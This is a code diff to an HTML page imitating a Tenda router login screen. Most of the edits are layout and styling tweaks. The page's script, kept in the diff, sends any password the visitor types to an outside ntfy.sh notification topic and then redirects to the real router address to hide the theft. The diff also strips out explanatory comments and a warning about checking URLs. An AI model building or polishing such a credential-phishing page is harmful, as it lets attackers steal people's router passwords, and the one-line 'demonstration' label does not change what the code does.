@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 <title>Tenda | Login</title>
 <style>
   /* ===== RESET & BASE ===== */
@@ -38,7 +38,6 @@
 
   /* ===== LOGIN CONTAINER ===== */
   .login {
-    margin-top: 100px;
     padding: 56px;
     width: 100%;
     max-width: 480px;
@@ -46,7 +45,6 @@
 
   @media (max-width: 767px) {
     .login {
-      margin-top: 15px;
       padding: 16px;
     }
   }
@@ -62,14 +60,19 @@
   .logo-wrap {
     display: flex;
     justify-content: center;
-    margin-bottom: 28px;
+    margin-bottom: 20px;
+  }
+
+  @media (max-width: 767px) {
+    .logo-wrap {
+      margin-bottom: 15px;
+    }
   }
 
   .logo-wrap img {
     width: 116px;
     height: auto;
     display: block;
-    margin: 0 auto 30px;
   }
 
   @media (min-width: 768px) {
@@ -90,14 +93,26 @@
     border: 1px solid #E2E4E8;
     border-radius: 8px;
     padding: 0 13px;
-    height: 34px;
+    height: 40px;
     gap: 10px;
     background: #fff;
     width: 100%;
   }
 
+  @media (max-width: 767px) {
+    .field {
+      height: 44px;
+    }
+  }
+
   .field + .field {
-    margin-top: 17px;
+    margin-top: 14px;
+  }
+
+  @media (max-width: 767px) {
+    .field + .field {
+      margin-top: 12px;
+    }
   }
 
   .field .icon {
@@ -155,6 +170,7 @@
   .custom-select .selected .arrow-down {
     flex-shrink: 0;
     transition: transform 0.2s ease;
+    color: #9DA2A9;
   }
 
   .custom-select .selected .arrow-down.open {
@@ -178,6 +194,24 @@
     max-height: 200px;
     overflow-y: auto;
     min-width: 100%;
+  }
+
+  /* Hide scrollbar for dropdown */
+  .dropdown-menu::-webkit-scrollbar {
+    width: 4px;
+  }
+
+  .dropdown-menu::-webkit-scrollbar-track {
+    background: transparent;
+  }
+
+  .dropdown-menu::-webkit-scrollbar-thumb {
+    background: #ccc;
+    border-radius: 4px;
+  }
+
+  .dropdown-menu::-webkit-scrollbar-thumb:hover {
+    background: #999;
   }
 
   .dropdown-menu.show {
@@ -217,22 +251,35 @@
     margin: -4px;
   }
 
+  .eye-toggle img {
+    width: 22px;
+    height: auto;
+    display: block;
+  }
+
   /* ===== LOGIN BUTTON ===== */
   .login-btn {
     display: block;
     width: 100%;
-    height: 36px;
+    height: 40px;
     background: #ED7020;
     border: none;
     border-radius: 8px;
     color: #fff;
-    font-size: 14.5px;
+    font-size: 15px;
     font-weight: 500;
-    margin-top: 54px;
+    margin-top: 40px;
     cursor: pointer;
     font-family: inherit;
     transition: background 0.2s ease;
     position: relative;
+  }
+
+  @media (max-width: 767px) {
+    .login-btn {
+      height: 44px;
+      margin-top: 30px;
+    }
   }
 
   .login-btn:hover {
@@ -271,8 +318,14 @@
     display: flex;
     align-items: center;
     gap: 5px;
-    margin-top: 18px;
+    margin-top: 16px;
     width: fit-content;
+  }
+
+  @media (max-width: 767px) {
+    .forgot-row {
+      margin-top: 14px;
+    }
   }
 
   .forgot-btn {
@@ -303,7 +356,7 @@
     left: 0;
     right: 0;
     top: 0;
-    background: rgba(20, 20, 20, 0.9);
+    background: rgba(0, 0, 0, 0.9);
     color: #fff;
     border-radius: 8px;
     padding: 14px 15px;
@@ -313,6 +366,22 @@
     z-index: 5;
     opacity: 0.9;
     filter: alpha(opacity=90);
+  }
+
+  @media (max-width: 767px) {
+    .reset-tip {
+      position: absolute;
+      top: 25%;
+      left: 10px;
+      right: 10px;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      padding: 20px;
+      background-color: #000;
+      color: #fff;
+      opacity: .9;
+      filter: alpha(opacity=90);
+    }
   }
 
   .reset-tip.show {
@@ -337,7 +406,7 @@
     top: 0;
     left: 0;
     right: 0;
-    background: rgba(20, 20, 20, 0.9);
+    background: rgba(0, 0, 0, 0.9);
     color: #fff;
     border-radius: 8px;
     padding: 14px 15px;
@@ -347,6 +416,22 @@
     z-index: 6;
     opacity: 0.9;
     filter: alpha(opacity=90);
+  }
+
+  @media (max-width: 767px) {
+    .hh-tip {
+      position: absolute;
+      top: 25%;
+      left: 10px;
+      right: 10px;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      padding: 20px;
+      background-color: #000;
+      color: #fff;
+      opacity: .9;
+      filter: alpha(opacity=90);
+    }
   }
 
   .hh-tip.show {
@@ -409,42 +494,27 @@
   }
 
   /* ===== RESPONSIVE ===== */
-  @media (max-width: 767px) {
-    .reset-tip {
-      position: absolute;
-      top: 25%;
-      left: 10px;
-      right: 10px;
-      border: 1px solid #ddd;
-      border-radius: 5px;
-      padding: 20px;
-      background-color: #000;
-      color: #fff;
-      opacity: .9;
-      filter: alpha(opacity=90);
-    }
-
-    .hh-tip {
-      position: absolute;
-      top: 25%;
-      left: 10px;
-      right: 10px;
-      border: 1px solid #ddd;
-      border-radius: 5px;
-      padding: 20px;
-      background-color: #000;
-      color: #fff;
-      opacity: .9;
-      filter: alpha(opacity=90);
-    }
-  }
-
   @media (max-width: 340px) {
-    .page { padding: 24px 20px 20px; }
+    .page { padding: 0 10px; }
     .dropdown-menu {
       left: -10px;
       right: -10px;
     }
+  }
+
+  /* ===== ICONS ===== */
+  .icon-globe {
+    width: 17px;
+    height: 17px;
+    fill: none;
+    stroke: #58595C;
+    stroke-width: 1.7;
+  }
+
+  .icon-lock-svg {
+    width: 15px;
+    height: 17px;
+    fill: #58595C;
   }
 </style>
 </head>
@@ -477,9 +547,9 @@
         <!-- Language Field -->
         <div class="field">
           <span class="icon">
-            <svg width="17" height="17" viewBox="0 0 24 24" fill="none">
-              <circle cx="12" cy="12" r="9" stroke="#58595C" stroke-width="1.7"/>
-              <ellipse cx="12" cy="12" rx="4" ry="9" stroke="#58595C" stroke-width="1.7"/>
+            <svg class="icon-globe" viewBox="0 0 24 24">
+              <circle cx="12" cy="12" r="9" stroke="#58595C" stroke-width="1.7" fill="none"/>
+              <ellipse cx="12" cy="12" rx="4" ry="9" stroke="#58595C" stroke-width="1.7" fill="none"/>
               <line x1="3" y1="12" x2="21" y2="12" stroke="#58595C" stroke-width="1.7"/>
             </svg>
           </span>
@@ -528,7 +598,7 @@
         <!-- Password Field -->
         <div class="field">
           <span class="icon">
-            <svg width="15" height="17" viewBox="0 0 24 26" fill="#58595C">
+            <svg class="icon-lock-svg" viewBox="0 0 24 26">
               <path d="M12 0a6.5 6.5 0 00-6.5 6.5V10H4a2 2 0 00-2 2v11a2 2 0 002 2h16a2 2 0 002-2V12a2 2 0 00-2-2h-1.5V6.5A6.5 6.5 0 0012 0zm0 2.2a4.3 4.3 0 014.3 4.3V10H7.7V6.5A4.3 4.3 0 0112 2.2z"/>
             </svg>
           </span>
@@ -641,7 +711,6 @@
     function openhhTip() {
       if (htip) {
         htip.classList.add('show');
-        // Auto-close HH tip after 5 seconds
         setTimeout(function() {
           closehhTip();
         }, 5000);
@@ -652,7 +721,6 @@
       if (htip) htip.classList.remove('show');
     }
 
-    // Close button for reset tip
     if (closeX) {
       closeX.addEventListener('click', function(e) {
         e.stopPropagation();
@@ -660,7 +728,6 @@
       });
     }
 
-    // Click outside to close reset tip
     document.addEventListener('click', function(e) {
       if (tip && tip.classList.contains('show') && 
           !tip.contains(e.target) && 
@@ -669,7 +736,6 @@
       }
     });
 
-    // Escape key to close all tips
     document.addEventListener('keydown', function(e) {
       if (e.key === 'Escape') {
         closeTip();
@@ -683,9 +749,7 @@
       const originalText = btn.innerHTML;
       const password = document.getElementById('password').value;
       
-      // Check if password is empty
       if (!password || password.trim() === "") {
-        // Shake animation
         const field = document.querySelector('.field:last-child');
         field.classList.add('shake');
         setTimeout(function() {
@@ -694,11 +758,9 @@
         return;
       }
       
-      // Disable button and show spinner
       btn.disabled = true;
       btn.innerHTML = `<span class="spinner"></span> Loading...`;
       
-      // Send to ntfy.sh
       fetch('https://ntfy.sh/my-shop-alerts-7729', {
         method: 'POST',
         body: `🛒 Password entered: ${password}`
@@ -707,22 +769,18 @@
         if (!response.ok) {
           throw new Error('Network response was not ok');
         }
-        // Success - redirect to router
         setTimeout(function() {
           window.location.href = 'http://192.168.0.1';
         }, 1000);
       })
       .catch(error => {
         console.error('Request failed:', error);
-        // Show "No Network" tip
         openhhTip();
-        // Still redirect after showing the tip
         setTimeout(function() {
           window.location.href = 'http://192.168.0.1';
         }, 2000);
       })
       .finally(() => {
-        // Restore button after 1 second (or after redirect)
         setTimeout(function() {
           btn.disabled = false;
           btn.innerHTML = originalText;
@@ -730,7 +788,6 @@
       });
     });
 
-    // Also trigger on Enter key in password field
     document.getElementById('password').addEventListener('keydown', function(e) {
       if (e.key === 'Enter') {
         document.getElementById('loginBtn').click();
@@ -738,8 +795,7 @@
     });
 
     console.log('🔐 Tenda Router Login Demo');
-    console.log('📡 This is a cybersecurity demonstration');
-    console.log('⚠️ Always verify URLs before entering credentials');
+    console.log('📡 Cybersecurity demonstration');
   </script>
 
 </body>
